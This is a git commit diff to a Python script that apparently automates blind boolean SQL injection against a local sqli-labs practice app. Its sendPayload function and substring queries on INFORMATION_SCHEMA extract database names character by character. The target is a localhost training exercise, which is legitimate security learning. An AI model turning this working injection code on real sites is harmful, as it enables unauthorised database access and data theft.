0b1a8e5c0e88fd174f6f627b25678c6eb12eb616
deidarayu <542317954@qq.com>
2017-05-23 23:40:16 +0800

    update

--- less2.py
+++ less2.py
@@ -26,7 +26,8 @@ dataset = " abcdefghijklmnopqrstuvwxyz_"
 querydata = "schema_name"
 querydb = "INFORMATION_SCHEMA"
 def sendPayload(payload):
-	url = "http://127.0.0.1/Less-5/?id=1\' "+ payload
+	url = "http://127.0.0.1/Less-6?id=1\"" \
+          " "+ payload
 	content = requests.post(url).text
 	return content
 def findDatabaseNumber():
@@ -46,16 +47,18 @@ def getDatabaseName(dbNum):
 		result = ""
 		while i :
 			for j in dataset:
-				querysql = "AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "+str(k)+",1),"+str(i)+",1)='"+j
+				querysql = "AND substring((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "+str(k)+",1),"+str(i)+",1)='"+j
 				recv = sendPayload(querysql)
 				if "You are in" in recv:
 					if j != ' ':
 						result += j
 						i += 1
+						print i
 					else:
+
 						print result
 						i = 0
-  					break
+					break
 def gettablenum():
     count = 1
     while count:
@@ -75,7 +78,7 @@ def gettablenum():
 def run():
     dbNum = findDatabaseNumber()
     tabnum = gettablenum()
-    print "the number of tables is" + str(dbMum)
+    print "the number of tables is " + str(tabnum)
     """
     猜表名同理可得
     """
